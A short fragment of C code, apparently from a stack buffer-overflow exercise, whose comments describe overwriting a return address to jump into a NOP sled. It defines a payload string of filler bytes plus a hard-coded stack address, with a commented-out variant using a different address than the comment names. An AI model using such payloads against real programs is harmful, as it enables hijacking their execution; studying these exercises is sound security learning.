...
/* -- place the code I am trying to execute in the buffer we are overflowing,
   and overwrite the return address so it points back into the buffer -- */
  // JER STRING -- I want to goto : 0x7fffffffde68 because it is somewhere in the NOPs:

// NEW PLACE:
char overflow[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x08\xde\xff\xff\xff\x7f\x00\x00";

//  char overflow[] = "\x01\x02\x03\x04\x05\x06\x07\x08\x01\x02\x03\x04\x05\x06\x07\x08\x68\xde\xff\xff\xff\x7f\x00\x00";
